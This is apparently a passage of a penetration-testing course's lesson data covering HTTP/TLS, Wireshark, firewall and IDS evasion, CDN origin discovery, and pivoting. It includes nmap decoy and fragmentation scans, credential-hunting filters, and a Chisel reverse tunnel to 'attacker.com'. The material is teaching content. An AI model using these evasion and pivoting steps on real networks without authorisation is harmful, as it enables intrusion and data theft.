        lessonNumber: "1.7",
        title: "Application Protocols for Hackers: HTTP/1.1, HTTP/2, HTTP/3, TLS & SSH",
        duration: "3 Hours",
        badge: "Web Protocols",
        summary:
          "The language of the web: HTTP request/response structure, CRLF byte separators, headers, methods, status codes, HTTPS & TLS 1.3 cryptographic handshakes, HTTP/2 binary multiplexing, HTTP/3 over QUIC, and Request Smuggling fundamentals.",
        studyNotes: [
          {
            heading: "Anatomy of an HTTP/1.1 Request & Response",
            subheading: "Plaintext text-based protocol that underpins the entire World Wide Web",
            points: [
              "An HTTP Request consists of 3 distinct sections separated by CRLF (`\\r\\n` / bytes `0x0D 0x0A`):",
              "1. Request Line: `[METHOD] [PATH] [HTTP-VERSION]` (e.g. `POST /api/login HTTP/1.1`)",
              "2. Headers: Key-value pairs (`Host: api.target.com`, `Content-Type: application/json`, `Cookie: session=xyz`)",
              "3. Blank Line (`\\r\\n\\r\\n`): Indicates the end of headers.",
              "4. Message Body (Optional): The data payload (JSON, form-urlencoded data, XML, binary files).",
              "HTTP Response Structure: Status Line (`HTTP/1.1 200 OK`), Response Headers (`Set-Cookie`, `Content-Length`), Blank Line, Response Body (HTML, JSON).",
              "HTTP Status Code Classes: 1xx Informational; 2xx Success (200 OK, 201 Created); 3xx Redirection (301 Moved Permanently, 302 Found); 4xx Client Error (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found); 5xx Server Error (500 Internal Server Error, 502 Bad Gateway).",
            ],
            diagramOrCode: `RAW HTTP/1.1 REQUEST (Every newline is \\r\\n)
POST /v1/auth HTTP/1.1[CRLF]
Host: target.com[CRLF]
Content-Type: application/json[CRLF]
Content-Length: 32[CRLF]
[CRLF]
{"user":"admin","pass":"secret"}`
          },
          {
            heading: "HTTPS & The TLS 1.3 Cryptographic Handshake",
            subheading: "How asymmetric and symmetric encryption secure HTTP traffic",
            points: [
              "Plaintext HTTP transmits data in the clear — anyone on the Wi-Fi or ISP path can read passwords via Wireshark. HTTPS wraps HTTP inside a TLS (Transport Layer Security) encrypted tunnel.",
              "Hybrid Cryptography: Asymmetric encryption (RSA or Elliptic Curve Diffie-Hellman Ephemeral - ECDHE) is slow, so it is used ONLY during the handshake to authenticate the server and securely agree on a shared secret key. Once agreed, fast Symmetric encryption (AES-256-GCM or ChaCha20-Poly1305) encrypts all data.",
              "TLS Certificates: Issued by trusted Certificate Authorities (CAs). Verifies domain ownership and prevents Man-in-the-Middle attacks.",
              "SNI (Server Name Indication): Transmits the target hostname during the initial TLS Client Hello before encryption starts, allowing virtual hosting on single IP addresses.",
            ],
          },
          {
            heading: "HTTP/2, HTTP/3 & Modern Request Smuggling Foundations",
            subheading: "Binary framing, multiplexing, and frontend-backend desynchronization",
            points: [
              "HTTP/2: Replaces plaintext text with a binary framing layer. Allows multiplexing — multiple concurrent requests and responses stream over a single TCP connection, eliminating head-of-line blocking.",
              "HTTP/3: Built on QUIC (Quick UDP Internet Connections) running over UDP instead of TCP, dramatically cutting handshake round-trips (0-RTT reconnects).",
              "HTTP Request Smuggling Foundation: Occurs when a frontend reverse proxy (like Cloudflare, Nginx, or HAProxy) and a backend web server disagree on where an HTTP request ends — specifically due to discrepancies between `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) headers. Allows an attacker to poison the web cache, steal other users' sessions, or bypass security controls!",
            ],
            callout: "Discrepancy attacks (like HTTP Request Smuggling) exist entirely because RFC specifications are interpreted slightly differently by different web server implementations. Mastering the raw byte structure of HTTP gives you superpower capabilities in web penetration testing.",
          },
        ],
        keyTopics: [
          "Anatomy of HTTP/1.1 request lines, headers, CRLF separators, and message bodies",
          "Master HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD)",
          "Interpret HTTP status code classes (2xx, 3xx, 4xx, 5xx)",
          "Analyze HTTPS TLS 1.3 hybrid asymmetric/symmetric key exchange and SNI",
          "Understand HTTP/2 multiplexing and the root cause of HTTP Request Smuggling",
        ],
        terminalCommands: [
          "curl -I -s -v https://example.com",
          "curl --http2 -I https://example.com",
          "printf 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n' | nc example.com 80",
        ],
        proTips: [
          "In Burp Suite Repeater, always toggle 'Show non-printable characters' to inspect exact carriage return and line feed (`\\r\\n`) byte endings; hidden whitespace in headers is the #1 trigger for request smuggling vulnerabilities.",
        ],
      },
      {
        id: "l-1-8",
        lessonNumber: "1.8",
        title: "Packet Sniffing & Traffic Forensics: Wireshark & tcpdump Masterclass",
        duration: "3 Hours",
        badge: "Traffic Analysis",
        summary:
          "Network traffic inspection mastery: Promiscuous mode, PCAP file formats, Wireshark 3-pane interface, building precision display filters, following TCP streams, extracting cleartext credentials, file carving, decrypting HTTPS, and CLI sniffing with tcpdump.",
        studyNotes: [
          {
            heading: "Packet Capture Fundamentals & Promiscuous Mode",
            subheading: "How network cards capture frames not originally destined for them",
            points: [
              "Under normal operating conditions, a computer's Network Interface Card (NIC) inspects the destination MAC address of incoming Ethernet frames. If the MAC does not match its own (or broadcast), the hardware drops the frame immediately.",
              "Promiscuous Mode: Tells the NIC driver to pass every single packet seen on the wire directly up to the operating system kernel, regardless of the destination MAC address.",
              "PCAP / PCAPNG: The industry-standard binary file format used to record raw network traffic packets for forensic analysis and security auditing.",
            ],
          },
          {
            heading: "Wireshark Architecture & Powerful Display Filters for Hackers",
            subheading: "Filtering millions of packets down to the exact vulnerability in seconds",
            points: [
              "The Three Wireshark Panes:",
              "1. Top Pane (Packet List): Chronological summary of every captured packet (Time, Source IP, Destination IP, Protocol, Length, Info).",
              "2. Middle Pane (Packet Details): Complete OSI layer breakdown; expandable trees for Ethernet, IP, TCP/UDP, and Application payloads.",
              "3. Bottom Pane (Packet Bytes): Raw hexadecimal and ASCII representation of the packet payload.",
              "Capture Filters vs. Display Filters: Capture filters (BPF syntax, e.g. `host 192.168.1.1 and port 80`) dictate what the kernel saves. Display filters (Wireshark syntax) filter the viewed packets in real time.",
              "Essential Display Filters for Hackers:",
              "`ip.addr == 192.168.1.50` -> Filters all traffic involving this host",
              "`tcp.port == 80 || tcp.port == 443` -> Web traffic only",
              "`http.request.method == \"POST\"` -> Submissions with logins or form data",
              "`frame contains \"password\" || frame contains \"token\"` -> Cleartext credential search",
              "`tcp.flags.syn == 1 && tcp.flags.ack == 0` -> Identify inbound port scans",
              "`dns.flags.response == 1 && dns.flags.rcode != 0` -> Find failed DNS lookups",
            ],
            diagramOrCode: `WIRESHARK 3-PANE ARCHITECTURE
+-------------------------------------------------------------+
| No. | Time   | Source        | Destination   | Protocol | Info
| 1   | 0.000  | 192.168.1.10  | 192.168.1.1   | TCP      | 443 > SYN
+-------------------------------------------------------------+
> Frame 1: 74 bytes on wire
> Ethernet II, Src: 00:11:22:33:44:55, Dst: 00:aa:bb:cc:dd:ee
> Internet Protocol Version 4, Src: 192.168.1.10, Dst: 192.168.1.1
> Transmission Control Protocol, Src Port: 54321, Dst Port: 443
+-------------------------------------------------------------+
0000  00 aa bb cc dd ee 00 11  22 33 44 55 08 00 45 00
0010  00 3c 1a 2b 40 00 40 06  ...`
          },
          {
            heading: "Following TCP Streams & Decrypting HTTPS Traffic",
            subheading: "Reconstructing entire conversations and stripping modern encryption",
            points: [
              "Following TCP Streams: Right-click any TCP packet -> 'Follow' -> 'TCP Stream'. Wireshark reassembles all fragmented segments and renders the complete human-readable client request (red) and server response (blue).",
              "File Carving / Exporting Objects: In Wireshark, navigate to `File -> Export Objects -> HTTP`. You can save downloaded images, PDFs, Word docs, and executables directly from network captures.",
              "Decrypting HTTPS with `SSLKEYLOGFILE`: Browsers (Chrome, Firefox) can be instructed to write their symmetric session keys to a file: `export SSLKEYLOGFILE=~/sslkeys.log`. In Wireshark, navigate to `Edit -> Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename`. Wireshark instantly decrypts all your TLS traffic in real time!",
            ],
          },
          {
            heading: "Command-Line Sniffing with tcpdump and tshark",
            subheading: "Capturing packets on remote headless Linux servers where GUI is unavailable",
            points: [
              "`tcpdump -i eth0 -n`: Sniffs traffic without resolving DNS (faster, leaves no reverse DNS footprint).",
              "`tcpdump -i eth0 -w capture.pcap`: Writes live traffic to a file for later Wireshark analysis.",
              "`tcpdump -i eth0 -A 'port 80'`: Dumps HTTP packet payloads directly in ASCII text to the terminal.",
              "`tshark`: Wireshark's command-line sibling; supports full Wireshark display filter syntax directly in bash scripts.",
            ],
          },
        ],
        keyTopics: [
          "Understand Promiscuous Mode mechanics on Network Interface Cards",
          "Navigate the 3-pane architecture of Wireshark (Packet List, Details, Bytes)",
          "Write advanced display filters for credentials, HTTP POSTs, and SYN scans",
          "Reassemble multi-packet conversations using 'Follow TCP Stream'",
          "Decrypt live HTTPS traffic using SSLKEYLOGFILE session master keys",
          "Execute headless packet captures using tcpdump and tshark CLI one-liners",
        ],
        terminalCommands: [
          "sudo tcpdump -i eth0 -n -c 20",
          "sudo tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12:1]&0xf0)>>2)) != 0)'",
          "tshark -i eth0 -Y 'http.request.method == \"POST\"' -T fields -e ip.src -e http.host -e http.request.uri",
          "export SSLKEYLOGFILE=~/sslkeys.log",
        ],
        proTips: [
          "When auditing an API or Android mobile app that uses SSL pinning, pairing an Android emulator with `SSLKEYLOGFILE` or Frida hooks allows you to inspect traffic in Wireshark even when traditional proxy tools like Burp Suite get rejected by certificate checks.",
        ],
      },
      {
        id: "l-1-9",
        lessonNumber: "1.9",
        title: "Advanced Network Defense, Firewalls, Evasion, Proxies & Pivoting",
        duration: "3 Hours",
        badge: "Advanced Network Pentest",
        summary:
          "Mastering enterprise network architecture and evasion: Stateful firewalls, Web Application Firewalls (WAFs), IDS/IPS evasion (packet fragmentation, decoy scanning), finding real origin IPs behind Cloudflare/CDNs, VLAN hopping, and lateral movement pivoting via SSH tunnels and Chisel.",
        studyNotes: [
          {
            heading: "Firewall Architecture & Inspection Types",
            subheading: "Packet-Filtering vs. Stateful vs. Next-Generation Firewalls vs. WAFs",
            points: [
              "Packet-Filtering Firewall (Stateless): Evaluates each packet in isolation against static rules (Source IP, Destination IP, Port). Has zero memory of previous packets.",
              "Stateful Inspection Firewall: Maintains a dynamic state table of active TCP and UDP connections. When an internal client initiates an outbound connection, the firewall automatically permits the returning traffic without needing a permanent inbound opening.",
              "Next-Generation Firewall (NGFW): Operates up to Layer 7. Performs Deep Packet Inspection (DPI) to identify application signatures regardless of what port they run on (e.g. detects BitTorrent running over port 443).",
              "Web Application Firewall (WAF): Dedicated Layer 7 filter (Cloudflare, AWS WAF, ModSecurity) designed specifically to inspect HTTP payloads for SQL injection, XSS, directory traversal, and command injection attacks.",
            ],
          },
          {
            heading: "Firewall & IDS/IPS Evasion Techniques for Penetration Testers",
            subheading: "How offensive engineers slip past automated security controls",
            points: [
              "Packet Fragmentation (`nmap -f`): Splits 20-byte IP headers and payloads across multiple tiny 8-byte fragments. Simple packet filters that inspect whole headers fail to assemble the puzzle before routing.",
              "Decoy Scanning (`nmap -D RND:10`): Injects 10 spoofed, random IP addresses into the scanning traffic alongside your real IP. The target firewall logs 11 simultaneous scans, making it nearly impossible for blue team analysts to tell which one is real.",
              "Source Port Manipulation (`nmap --source-port 53`): Many legacy firewalls blindly trust inbound traffic originating from UDP/TCP port 53 (DNS) or port 88 (Kerberos). Spoofing your source port to 53 can bypass restrictive ingress filters.",
              "Data Padding & MTU Manipulation: Altering the Maximum Transmission Unit (`--mtu 16`) or appending arbitrary payload bytes (`--data-length 25`) evades signature-based IDS engines.",
            ],
          },
          {
            heading: "Reverse Proxies, CDNs & Finding Real Origin IPs",
            subheading: "Bypassing Cloudflare, Akamai, and Fastly to strike vulnerable backend servers",
            points: [
              "Content Delivery Networks (CDNs) and Reverse Proxies sit in front of web servers. When an attacker attacks `example.com`, they are actually attacking Cloudflare's edge cache, which blocks malicious payloads.",
              "If the attacker discovers the Real Origin IP of the backend server (the actual Linux machine behind Cloudflare), they can bypass the WAF entirely and attack the origin server directly!",
              "Techniques to Find Real Origin IPs:",
              "1. Historical DNS Records: Check historical DNS databases (SecurityTrails, ViewDNS, DNSDumpster). Often, companies ran their servers on the origin IP for years before turning on Cloudflare.",
              "2. SSL Certificate Search: Search Censys.io or Shodan.io for the target's SSL certificate SHA-256 fingerprint. Shodan scans the entire IPv4 Internet; if an origin server presents the SSL certificate on port 443, Shodan has logged its real IP.",
              "3. Email Header Analysis: Trigger an automated email from the application (e.g. 'Forgot Password'). Inspect the `Received: from` header in the raw email headers; it often reveals the internal origin IP.",
            ],
            callout: "Bypassing a CDN by finding the origin IP is one of the most celebrated skills in bug bounty hunting. A vulnerability that gets blocked with a '403 WAF Blocked' on the main domain can often be executed immediately on the direct origin IP!",
          },
          {
            heading: "Network Segmentation, VLANs & VLAN Hopping",
            subheading: "Breaking out of isolated corporate networks",
            points: [
              "Network Segmentation isolates sensitive networks (e.g. Payment Processing PCI-DSS zone) from general employee workstations.",
              "DMZ (Demilitarized Zone): A perimeter subnet between the public Internet and the private internal network. Houses public servers (web, mail, DNS). If a web server is hacked, firewall rules prevent it from accessing the internal database zone.",
              "VLANs (Virtual LANs - IEEE 802.1Q): Logically separate different subnets on the exact same physical switch hardware using 4-byte 802.1Q tags.",
              "VLAN Hopping Attacks:",
              "1. Switch Spoofing: An attacker's machine pretends to be another Cisco switch using Dynamic Trunking Protocol (DTP), creating an 802.1Q trunk link to receive traffic from ALL VLANs.",
              "2. Double Tagging: Prepending two VLAN tags to an Ethernet frame. The first switch strips the outer tag, and the second switch forwards the frame to the victim VLAN. (Unidirectional attack).",
            ],
          },
          {
            heading: "Network Pivoting, Tunneling & Port Forwarding (SSH & Chisel)",
            subheading: "How to use a compromised machine as a springboard into internal networks",
            points: [
              "When you compromise a machine (Host A) that has two network cards — one facing the Internet (192.168.1.10) and one facing an internal private network (10.10.10.5) — you cannot directly reach the internal network from your Kali Linux machine. You must Pivot.",
              "Local Port Forwarding (`ssh -L`): Forwards a port from your local machine to a remote internal server through the pivot host: `ssh -L 8080:10.10.10.20:80 user@192.168.1.10`. Visiting `http://localhost:8080` loads the internal server!",
              "Dynamic Port Forwarding (`ssh -D`): Creates a local SOCKS5 proxy: `ssh -D 1080 user@192.168.1.10`. By configuring `proxychains` in Kali Linux (`/etc/proxychains4.conf`), you can run ANY tool through the pivot: `proxychains nmap -sT 10.10.10.0/24`.",
              "Chisel: A fast, modern TCP/UDP tunnel written in Go that tunnels traffic over HTTP/WebSockets, bypassing restrictive corporate firewalls that block standard SSH ports.",
            ],
            diagramOrCode: `PIVOTING THROUGH A DUAL-HOMED HOST
[ Attacker Kali ]
       | (Public Internet / Allowed SSH)
       v
[ Compromised Web Server (Pivot) ]
       | NIC 1: 192.168.1.10 (Public)
       | NIC 2: 10.10.10.5   (Internal LAN)
       v
[ Hidden Internal Domain Controller / Database (10.10.10.100) ]
(Completely Inaccessible from the Internet Directly)`
          },
        ],
        keyTopics: [
          "Understand differences between Stateless, Stateful, Next-Gen (NGFW), and Web Application (WAF) firewalls",
          "Apply IDS/IPS evasion: Packet fragmentation (-f), Decoy scanning (-D), and Source port spoofing (--source-port 53)",
          "Discover real origin IPs behind Cloudflare/Akamai using historical DNS and SSL certificate fingerprinting",
          "Analyze DMZ architectures, VLAN 802.1Q tagging, and VLAN Hopping mechanics",
          "Master network pivoting with SSH Local, Remote, and Dynamic SOCKS5 tunneling and Chisel",
        ],
        terminalCommands: [
          "sudo nmap -sS -f --mtu 16 -D RND:5 -p 80,443 target.com",
          "ssh -D 1080 -N -f user@pivot-host.com",
          "proxychains nmap -sT -Pn -p 22,80,443 10.10.10.0/24",
          "./chisel client attacker.com:8000 R:socks",
        ],
        proTips: [
          "When pivoting into an internal enterprise network through a Linux pivot host, always disable DNS lookups in proxychains (`/etc/proxychains4.conf` -> comment out `proxy_dns`) if internal DNS servers are unroutable, or specify the internal DNS server directly to avoid massive timeout delays.",
        ],
      },
    ],
    handsOnLab: {
      title: "Lab 1: Comprehensive Network Forensics, Reconnaissance & Traffic Decryption",
      target: "Vulnerable Network Simulation Environment & Live Wireshark Capture",
      goal: "Start from zero network enumeration, calculate subnets, execute DNS zone transfers, analyze raw HTTP headers, reconstruct credentials from Wireshark PCAPs, and configure an SSH SOCKS5 pivot tunnel.",
      steps: [
        "1. Map your local network interface, MAC address, and subnet mask using `ip addr show` and `ipcalc`.",
        "2. Query authoritative nameservers for the target domain and test for unauthenticated DNS Zone Transfer (AXFR) using `dig axfr`.",
        "3. Launch Wireshark in promiscuous mode on your primary network interface with display filter `http.request || dns`.",
        "4. Trigger an authentication request to a test application, locate the packet in the Wireshark list, and follow the TCP Stream to extract the raw HTTP payload.",
        "5. Re-run an Nmap scan using decoy IPs (`-D RND:5`) and inspect the resulting capture in Wireshark to verify that multiple source IPs are logged.",
        "6. Establish an SSH dynamic SOCKS5 proxy tunnel (`ssh -D 1080`) and route command-line tools through `proxychains` to access an internal target.",
      ],
      verification: "Verify that all internal subdomains are extracted via AXFR, cleartext credentials are recovered from the PCAP stream, and internal hosts are reachable through the SOCKS5 proxy tunnel.",
    },
    checklist: [
      { id: "ch1-t1", label: "Mastered 'What is a Computer Network?': Hosts, Media, Bandwidth, and PAN/LAN/MAN/WAN" },
      { id: "ch1-t2", label: "Understood Topologies (Star, Mesh, Bus) and hardware (Hubs, Switches, Routers, Firewalls)" },
      { id: "ch1-t3", label: "Analyzed Collision Domains vs Broadcast Domains and how switches eliminate collisions" },
      { id: "ch1-t4", label: "Mastered the 5-step Encapsulation / Decapsulation lifecycle (Data -> Segment -> Packet -> Frame -> Bits)" },
      { id: "ch1-t5", label: "Understood MAC addressing, IEEE OUI vendor prefixes, and ARP Cache Poisoning (MITM)" },
      { id: "ch1-t6", label: "Mastered all 7 layers of the OSI model and their specific offensive attack surfaces" },
      { id: "ch1-t7", label: "Calculated IPv4 subnet masks, CIDR notations (/24, /28, /30), and memorized RFC 1918 private ranges" },
      { id: "ch1-t8", label: "Analyzed cloud metadata link-local IP 169.254.169.254 and its role in SSRF vulnerabilities" },
      { id: "ch1-t9", label: "Dissected TCP 3-Way Handshake (SYN, SYN-ACK, ACK), teardown, and all 6 TCP flags" },
      { id: "ch1-t10", label: "Mastered Nmap port scanning mechanics: SYN Stealth (-sS), Connect (-sT), and UDP (-sU)" },
      { id: "ch1-t11", label: "Traced the complete DNS resolution chain and exploited DNS Zone Transfers (AXFR)" },
      { id: "ch1-t12", label: "Understood DHCP DORA allocation, starvation attacks, and NAT/PAT port forwarding" },
      { id: "ch1-t13", label: "Dissected raw HTTP/1.1 request/response structures, CRLF separators, and TLS 1.3 handshakes" },
      { id: "ch1-t14", label: "Captured and analyzed live network traffic in Wireshark and reconstructed TCP streams" },
      { id: "ch1-t15", label: "Decrypted live HTTPS traffic using SSLKEYLOGFILE session master keys in Wireshark" },
      { id: "ch1-t16", label: "Executed IDS/IPS firewall evasion using packet fragmentation (-f) and decoy scans (-D)" },
      { id: "ch1-t17", label: "Discovered real origin IPs behind Cloudflare/CDNs using historical DNS and SSL fingerprints" },
      { id: "ch1-t18", label: "Configured SSH dynamic SOCKS5 proxies and pivoted through dual-homed hosts with Proxychains" },
    ],
  };
